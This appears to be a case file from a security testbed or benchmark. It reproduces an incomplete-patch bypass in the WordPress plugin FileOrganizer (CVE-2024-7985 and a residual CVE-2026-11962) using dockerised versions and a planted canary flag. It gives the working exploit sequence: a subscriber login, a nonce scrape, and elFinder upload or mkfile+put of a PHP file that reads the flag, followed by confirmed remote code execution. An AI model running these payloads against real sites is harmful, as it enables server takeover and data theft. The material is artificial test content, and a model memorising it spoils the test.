## REUSABLE WordPress-plugin recipe (first of its kind; later WP-plugin cases copy this)
  official `wordpress:php8.2-apache` + `mariadb:11` + wp-cli.
  wp-entrypoint.sh (per profile, one wp container):
    1. plant $PCB_FLAG -> /flag/pcb_flag.txt (outside /var/www/html)
    2. install wp-cli, WordPress core, admin + a low-priv `subscriber`
    3. wp plugin install fileorganizer --version=$FO_VERSION  (pinned, from wordpress.org at up-time)
    4. drop mu-plugin lowering FileOrganizer's capability to `read` via the plugin's OWN
       `fileorganizer_get_capability` filter (env config, NOT app-code edit; = what Pro does)
  No vendored plugin source/images committed; only small text lives in the case dir.

## Roles
  V0 = FileOrganizer 1.0.9  (port 39440) — vulnerable to CVE-2024-7985
  V1 = FileOrganizer 1.1.0  (port 39441) — 7985-patched INCOMPLETELY -> CVE-2026-11962  <- TARGET
  V2 = FileOrganizer 1.2.0  (port 39442) — 11962-fixed (negative)

## Mechanism (source-verified via 1.0.9/1.1.0/1.2.0 diff of main/ajax.php)
  7985 fix (1.0.9->1.1.0): added wp_check_filetype() to ONLY the elFinder `upload.presave` bind
       (and only for non-`activate_plugins` users). Sibling write ops left UNVALIDATED.
  11962 (1.1.0->1.2.0): adds mkfile.pre / rename.pre / paste.pre / extract.pre validation.

## Access model (why a subscriber, not admin)
  The `upload.presave` check is skipped for `activate_plugins` (admin) users, so the differential
  is only visible for a non-admin granted file-manager access — exactly the CVE's "Subscriber+
  with granted permissions" precondition (the Pro add-on grants it). Driven as WP `subscriber`,
  capability lowered via the plugin's own fileorganizer_get_capability filter.

## Payloads (driven through the normal FileOrganizer AJAX endpoint; no app code touched)
  login subscriber -> scrape fileorganizer_ajax_nonce -> elFinder open (root hash l1_Lw)
  seed     (CVE-2024-7985): cmd=upload  target=<root> upload[]=(pcb_seed.php,   '<?php echo file_get_contents("/flag/pcb_flag.txt");?>')
  residual (CVE-2026-11962): cmd=mkfile name=pcb_bypass.php ; cmd=put target=<hash> content='<?php echo file_get_contents("/flag/pcb_flag.txt");?>'
  then GET /pcb_seed.php or /pcb_bypass.php to execute + exfiltrate the canary.

## V0 = FileOrganizer 1.0.9 (port 39440)
  seed  upload   : elFinder added ok  -> GET /pcb_seed.php   -> HTTP 200 CANARY-HIT   (no upload validation)
  residual mkfile+put :               -> GET /pcb_bypass.php -> HTTP 200 CANARY-HIT

## V1 = FileOrganizer 1.1.0 (port 39441) — THE TARGET the system attacks
  seed  upload   : elFinder {"warning":["File type is not allowed."]} -> GET /pcb_seed.php -> no canary  <- seed BLOCKED (differential precondition)
  residual mkfile+put : mkfile ok, put ok -> GET /pcb_bypass.php -> HTTP 200 CANARY-HIT   <- residual CONFIRMED (flag exfiltrated via RCE)

## V2 = FileOrganizer 1.2.0 (port 39442) — negative (separately verified)
  seed  upload        : {"warning":["File type is not allowed."]}      -> no canary
  residual mkfile+put : {"mkfile":{"error":"File type is not allowed."}} -> no canary   <- residual CLOSED by 11962 fix

